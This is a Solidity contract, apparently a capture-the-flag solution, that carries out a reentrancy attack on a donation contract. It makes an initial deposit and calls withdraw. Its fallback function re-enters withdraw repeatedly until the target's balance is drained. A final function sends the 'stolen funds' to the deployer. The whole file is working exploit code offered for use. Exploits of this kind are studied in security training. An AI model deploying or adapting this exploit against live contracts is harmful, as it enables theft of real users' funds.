pragma solidity 0.8.4;

interface ReentranceInterface{
    function donate(address _to) external payable;
    function balanceOf(address _who) external view returns (uint balance);
    function withdraw(uint _amount) external;
    function balances(address) external view returns (uint);
}

contract ReentranceExploit{
    // Variables & Declarations
	address reentranceAddr;
    address owner;
    uint amount;

	// Constructor
	constructor(address addr, uint _amount) public{
		reentranceAddr = addr;
        owner = msg.sender;
        amount = _amount;
	}

    // Methods
    // Make an initial donation in order to be able to withdraw later
    function initial_donation() public payable{
        // Access to target contract
        ReentranceInterface ri = ReentranceInterface(reentranceAddr);
        ri.donate{value: amount}(address(this));
    }
    
    function attack(uint _amount) public payable{
        // Access to target contract
        ReentranceInterface ri = ReentranceInterface(reentranceAddr);
        // Withdraw Amount
        ri.withdraw(amount);

    }
    //Fallback function for the reentrant approach
    fallback() external payable{
        ReentranceInterface ri = ReentranceInterface(reentranceAddr);
        if(address(ri).balance >= amount){
            attack(amount);
        }
        else{
            attack(address(ri).balance);
        }
    }

    function withdraw_stolen_funds() public{ // Transfer stolen funds to attacker's original addr
        require(owner == msg.sender);
        payable(owner).transfer(address(this).balance); // Since transfer is only available for objects of type "address payable" cast it
    }

}